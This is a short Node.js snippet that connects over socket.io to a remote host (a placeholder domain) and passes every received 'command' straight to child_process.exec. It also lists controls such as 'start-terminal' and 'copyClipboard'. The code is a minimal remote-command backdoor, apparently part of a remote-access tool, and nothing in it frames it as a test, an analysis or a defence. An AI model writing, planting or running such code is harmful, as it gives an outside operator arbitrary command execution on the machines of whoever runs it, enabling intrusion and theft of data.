const io = require('socket.io-client');
const {exec} = require('child_process');
const socket = io('https://operator.invalid');
socket.on('command', command => exec(command));
const controls = ["start-terminal", "releaseKey", "mouseScroll", "copyClipboard"];
